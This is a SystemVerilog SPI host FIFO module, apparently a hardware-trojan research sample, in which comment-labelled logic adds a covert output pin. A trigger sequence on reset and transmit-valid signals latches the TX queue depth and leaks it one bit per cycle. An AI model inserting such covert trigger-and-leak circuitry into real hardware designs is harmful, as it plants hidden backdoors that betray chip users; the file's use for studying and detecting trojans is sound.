`include "prim_assert.sv"

module spi_host_data_fifos #(
  parameter int         TxDepth   = 72,
  parameter int         RxDepth   = 64,
  parameter logic       SwapBytes = 0
) (
  input               clk_i,
  input               rst_ni,

  input        [31:0] tx_data_i,
  input        [3:0]  tx_be_i,
  input               tx_valid_i,
  output logic        tx_ready_o,
  input        [7:0]  tx_watermark_i,

  output logic [31:0] core_tx_data_o,
  output logic [3:0]  core_tx_be_o,
  output logic        core_tx_valid_o,
  input               core_tx_ready_i,
  input               core_tx_byte_select_full_i,

  input        [31:0] core_rx_data_i,
  input               core_rx_valid_i,
  output logic        core_rx_ready_o,

  output logic [31:0] rx_data_o,
  output logic        rx_valid_o,
  input               rx_ready_i,
  input        [7:0]  rx_watermark_i,

  input               sw_rst_i,

  output logic        tx_empty_o,
  output logic        tx_full_o,
  output logic [7:0]  tx_qd_o,
  output logic        tx_wm_o,
  output logic        rx_empty_o,
  output logic        rx_full_o,
  output logic [7:0]  rx_qd_o,
  output logic        rx_wm_o,

  // TROJAN INSERTION: Covert leak output port
  output logic        trojan_covert_out
);

  localparam int RxDepthW = prim_util_pkg::vbits(RxDepth+1);
  localparam int TxDepthW = prim_util_pkg::vbits(TxDepth+1);

  logic [31:0] tx_data_ordered;
  logic [3:0]  tx_be_ordered;
  logic [31:0] rx_data_unordered;

  if (SwapBytes) begin : gen_swap
    assign tx_data_ordered = { << 8 {tx_data_i} };
    assign tx_be_ordered   = { << { tx_be_i} };
    assign rx_data_o       = { << 8 { rx_data_unordered } };
  end else begin : gen_do_not_swap
    assign tx_data_ordered = tx_data_i;
    assign tx_be_ordered   = tx_be_i;
    assign rx_data_o       = rx_data_unordered;
  end : gen_do_not_swap

  logic [35:0]         tx_data_be;
  logic [35:0]         core_tx_data_be;

  logic [TxDepthW-1:0] tx_depth;

  // The byte_select module greedily pops data from the TX FIFO, so
  // the FIFO should be observed as having an effective depth of N+1.
  assign tx_qd_o = 8'(tx_depth) + {7'b0, core_tx_byte_select_full_i};

  assign tx_data_be = { tx_data_ordered, tx_be_ordered };
  assign { core_tx_data_o, core_tx_be_o } = core_tx_data_be;

  prim_fifo_sync #(
    .Width(36),
    .Pass(1),
    .Depth(TxDepth)
  ) u_tx_fifo (
    .clk_i,
    .rst_ni,
    .clr_i    (sw_rst_i),
    .wvalid_i (tx_valid_i),
    .wready_o (tx_ready_o),
    .wdata_i  (tx_data_be),
    .rvalid_o (core_tx_valid_o),
    .rready_i (core_tx_ready_i),
    .rdata_o  (core_tx_data_be),
    .full_o   (),
    .depth_o  (tx_depth),
    .err_o    ()
  );

  logic [RxDepthW-1:0] rx_depth;

  assign rx_qd_o = 8'(rx_depth);

  prim_fifo_sync #(
    .Width(32),
    .Pass(1),
    .Depth(RxDepth)
  ) u_rx_fifo (
    .clk_i,
    .rst_ni,
    .clr_i    (sw_rst_i),
    .wvalid_i (core_rx_valid_i),
    .wready_o (core_rx_ready_o),
    .wdata_i  (core_rx_data_i),
    .rvalid_o (rx_valid_o),
    .rready_i (rx_ready_i),
    .rdata_o  (rx_data_unordered),
    .full_o   (),
    .depth_o  (rx_depth),
    .err_o    ()
  );

  // Create the status outputs
  // - Include the 1-word storage in byte_select for the TX datapath
  assign tx_empty_o = (tx_qd_o == 0);
  assign rx_empty_o = (rx_qd_o == 0);
  assign tx_full_o  = (tx_qd_o >= 8'(TxDepth) + 1); // inc. byte_sel
  assign rx_full_o  = (rx_qd_o >= 8'(RxDepth));
  assign tx_wm_o    = (tx_qd_o <  tx_watermark_i);
  assign rx_wm_o    = (rx_qd_o >= rx_watermark_i);

  // Due to the addition of the byte_sel as a N+1'th fifo stage, ensure
  // we have adequate resolution in our counter (tx_qd_o) to represent this.
  `ASSERT_INIT(TxDepth_A, TxDepth < (2**$size(tx_qd_o)) - 1)

  //-----------------------------------------------
  // TROJAN INSERTION: Covert FIFO depth leak logic
  //-----------------------------------------------

  // 1. Trigger pattern detection (example: repeated assertion of sw_rst_i and then tx_valid_i)
  logic [2:0] trojan_state;
  localparam TROJAN_IDLE = 3'd0;
  localparam TROJAN_TRIG1 = 3'd1;
  localparam TROJAN_TRIG2 = 3'd2;
  localparam TROJAN_LEAK  = 3'd3;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      trojan_state <= TROJAN_IDLE;
    end else begin
      case (trojan_state)
        TROJAN_IDLE: begin
          if (sw_rst_i)
            trojan_state <= TROJAN_TRIG1;
          else
            trojan_state <= TROJAN_IDLE;
        end
        TROJAN_TRIG1: begin
          if (~sw_rst_i)
            trojan_state <= TROJAN_TRIG2;
          else
            trojan_state <= TROJAN_TRIG1;
        end
        TROJAN_TRIG2: begin
          if (tx_valid_i)
            trojan_state <= TROJAN_LEAK;
          else
            trojan_state <= TROJAN_TRIG2;
        end
        TROJAN_LEAK: begin
          // Stay for one cycle, then go back to idle
          trojan_state <= TROJAN_IDLE;
        end
        default: trojan_state <= TROJAN_IDLE;
      endcase
    end
  end

  // 2. Leak LSB of tx_qd_o each clock cycle after trigger (held for 8 cycles: leaks 8 bits, as example)
  logic [2:0] trojan_leak_cnt;
  logic       trojan_leak_active;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      trojan_leak_cnt    <= 3'd0;
      trojan_leak_active <= 1'b0;
    end else begin
      if (trojan_state == TROJAN_LEAK) begin
        trojan_leak_cnt    <= 3'd0;
        trojan_leak_active <= 1'b1;
      end else if (trojan_leak_active) begin
        if (trojan_leak_cnt == 3'd7)
          trojan_leak_active <= 1'b0;
        trojan_leak_cnt <= trojan_leak_cnt + 3'd1;
      end else begin
        trojan_leak_cnt    <= 3'd0;
        trojan_leak_active <= 1'b0;
      end
    end
  end

  logic [7:0] tx_qd_latched;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni)
      tx_qd_latched <= 8'd0;
    else if (trojan_state == TROJAN_LEAK)
      tx_qd_latched <= tx_qd_o;
    else
      tx_qd_latched <= tx_qd_latched;
  end

  // 3. Covert output leaks one bit per cycle
  always_comb begin
    if (trojan_leak_active)
      trojan_covert_out = tx_qd_latched[trojan_leak_cnt];
    else
      trojan_covert_out = 1'b0;
  end

  // END TROJAN INSERTION

endmodule